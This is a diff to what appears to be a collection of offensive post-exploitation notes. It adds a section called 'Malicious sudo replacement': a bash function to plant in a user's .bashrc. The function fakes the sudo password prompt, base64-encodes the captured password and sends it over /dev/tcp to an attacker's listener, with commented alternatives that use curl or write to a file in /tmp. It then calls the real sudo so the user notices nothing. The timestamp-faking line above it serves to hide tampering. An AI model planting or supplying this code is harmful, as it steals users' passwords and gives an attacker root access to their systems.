@@ -202,3 +202,23 @@ Often when uploading files or modifying existing files, the date stamps can be a
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>touch -d "5 January 2021" /.abc</code>
 
+### Malicious sudo replacement
+
+add this function to .bashrc in users' profile. If they use bash, the next time they open a session and sudo, the pw will be sent to the web server you run or alternatively you can write it to a file
+
+~~~
+function sudo () 
+{ 
+    realsudo="/usr/bin/sudo"
+    #read -s "inputPasswd?[sudo] password for $USER: " #use this line for ZSH
+    read -s -p "[sudo] password for $USER: " inputPasswd #use this line for bash
+    printf "\n"
+  #  printf '%s\n' "$USER : $inputPasswd" > /tmp/llcv #use this to write to a file
+    encoded=$(printf '%s' "$USER : $inputPasswd" | base64) > /dev/null 2>&1    
+   # curl -s "http://127.0.0.1:8989/$encoded" > /dev/null 2>&1 #use this for zsh
+    exec 3<>/dev/tcp/127.0.0.1/80;echo -e "GET /bash$encoded HTTP/1.1\r\nhost: http://127.0.0.1\r\nConnection: close\r\n\r\n" >&3 #edit this line with your webserver that is listening
+    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1
+    $realsudo "${@:1}"
+}
+ 
+~~~
